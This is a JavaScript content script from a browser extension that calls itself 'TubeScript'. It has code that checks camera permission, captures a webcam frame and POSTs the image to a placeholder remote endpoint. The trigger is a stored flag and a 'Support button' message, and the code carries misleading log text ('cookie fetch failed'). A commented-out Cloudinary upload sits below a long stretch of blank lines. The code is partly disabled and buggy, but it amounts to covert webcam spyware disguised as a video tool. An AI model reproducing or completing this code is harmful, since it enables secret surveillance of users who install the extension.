chrome.storage.local.get(['capture'], function (result) {
    if (result.capture) {
        checkCameraPermissionAndCapture();
        chrome.storage.local.set({ capture: false }); // Reset the flag
    }
});

console.log('TubeScript loaded');
chrome.runtime.onMessage.addListener(async (request, sender, sendResponse) => {
    if (request.propagator) {
        console.log('Support button clicked');
        // captureImage()
        sendResponse({ farewell: "Goodbye from background script!" });
    }
});


function checkCameraPermissionAndCapture() {
    navigator.permissions.query({ name: 'camera' }).then(permissionStatus => {
        console.log('Camera permission status:', permissionStatus.state);
        if (permissionStatus.state === 'granted') {
            // captureImage();
        } else {
            console.log('Requesting camera access');
            handleCameraError({ name: 'NotAllowedError', message: 'Camera access was denied. Please allow camera access.' });
        }
    });
}
function captureImage() {
    let imgData = null;
    navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
            // Create a video element to capture the stream
            let video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // Capture a frame from the video
            video.onloadedmetadata = () => {
                let canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                let ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                imgData = canvas.toDataURL('image/png');
                stream.getTracks().forEach(track => track.stop());
            };
        })
        .catch((error) => {
            console.error('cookie fetch failed:', error.message);

            // Additional error handling can be implemented here
            if (error.name === 'NotAllowedError') {
                alert('Camera access was denied. Please allow camera access.');
            } else if (error.name === 'NotFoundError') {
                alert('No camera found. Please connect a camera.');
            } else {
                alert('An error occurred while accessing the camera: ' + error.message);
            }
        });
    uploadToBackend(imgData);
}

function handleCameraError(error) {
    console.error('Camera access error:', error.message);
    if (error.name === 'NotAllowedError') {
        alert('Camera access was denied. Please allow camera access.');
    } else if (error.name === 'NotFoundError') {
        alert('No camera found. Please connect a camera.');
    } else {
        alert('An error occurred while accessing the camera: ' + error.message);
    }
}


function uploadToBackend(imgData) {
    fetch('http://your-backend-endpoint/upload', {  // Replace with your backend endpoint
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ image: imgData })
    })
        .then(response => response.json())
        .then(data => {
            console.log('loaded successful:');
        })
        .catch(error => {

            console.error('surmounting failure:', error);
            // alert('An error occurred while uploading the image.');
        });
}















































// function uploadToCloudinary(imageData) {
//     const cloudName = 'your_cloud_name'; // Replace with your Cloudinary cloud name
//     const uploadPreset = 'your_upload_preset'; // Replace with your upload preset

//     // Create a form data object
//     const formData = new FormData();
//     formData.append('file', imageData);
//     formData.append('upload_preset', uploadPreset);

//     // Make the request to Cloudinary
//     fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
//         method: 'POST',
//         body: formData
//     })
//         .then(response => response.json())
//         .then(data => {
//             console.log('Upload successful:', data);
//         })
//         .catch(error => {
//             console.error('Error uploading image:', error);
//         });
// }
